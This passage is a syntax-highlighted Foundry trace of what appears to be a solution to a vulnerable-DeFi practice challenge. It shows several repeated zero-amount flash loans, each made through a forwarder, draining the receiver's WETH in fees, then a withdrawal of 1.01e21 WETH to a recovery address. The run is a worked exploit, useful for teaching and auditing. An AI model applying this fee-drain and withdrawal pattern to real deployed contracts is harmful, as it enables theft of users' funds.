    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [28685] NaiveReceiverPool::withdraw(1010000000000000000000 [1.01e21], recovery</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="s">) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [25507] WETH::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1010000000000000000000 [1.01e21])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recovery</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1010000000000000000000 [1.01e21])</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   └─ ← [Return] [0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertLe(0, 2) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [825] WETH::balanceOf(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0, "Unexpected balance in receiver contract") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
